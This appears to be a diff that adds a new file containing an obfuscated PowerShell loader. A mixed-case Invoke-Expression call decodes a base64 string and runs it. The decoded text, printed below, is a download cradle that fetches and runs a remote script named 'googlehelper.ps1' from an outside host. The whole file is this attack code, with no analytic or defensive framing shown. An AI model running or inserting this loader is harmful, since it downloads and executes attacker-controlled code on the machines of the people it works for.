@@ -1,0 +1,7 @@
+iex([sysTem.teXT.eNCOdINg]::utF8.GeTSTriNG([sysTem.cOnveRt]::froMBAse64sTRing('CklFWCAoTmV3LU9iamVjdCBuRXQuV0ViY0xpRW50KS5kb1dubE9hRFNUcklORygnaHR0cDovL2Nhbm5vdC5sb2dpbnRvLm1lL2dvb2dsZWhlbHBlci5wczEnKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+IEX (New-Object nEt.WEbcLiEnt).doWnlOaDSTrING('http://cannot.loginto.me/googlehelper.ps1')
+
